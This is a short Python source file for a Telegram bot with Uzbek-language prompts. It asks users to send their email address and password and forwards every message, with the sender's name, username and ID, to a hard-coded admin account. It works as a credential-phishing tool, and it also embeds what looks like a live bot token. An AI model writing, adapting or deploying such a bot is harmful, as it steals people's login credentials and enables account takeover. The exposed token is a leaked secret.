import logging
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext

TOKEN = "8955943607:AAGdJwpSZ9S4uK-_JZmVgSYc6kRxM-SA3Fw"
ADMIN_ID = 5680099361  

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

def start(update: Update, context: CallbackContext):
    keyboard = [
        [KeyboardButton("📧 Pochta kiritish"), KeyboardButton("🔑 Parol kiritish")]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    update.message.reply_text(
        "Assalomu alaykum! Kerakli bo'limni tanlang:",
        reply_markup=reply_markup
    )

def handle_message(update: Update, context: CallbackContext):
    user = update.message.from_user
    text = update.message.text
    
    admin_text = (
        f"📩 Yangi ma'lumot keldi!\n\n"
        f"👤 Foydalanuvchi: {user.full_name} (@{user.username})\n"
        f"🆔 ID: {user.id}\n"
        f"📝 Matn: {text}"
    )
    
    context.bot.send_message(chat_id=ADMIN_ID, text=admin_text)
    
    if text == "📧 Pochta kiritish":
        update.message.reply_text("Iltimos, pochtangizni yuboring:")
    elif text == "🔑 Parol kiritish":
        update.message.reply_text("Iltimos, parolingizni yuboring:")
    else:
        update.message.reply_text("Ma'lumot adminga yuborildi!")

def main():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
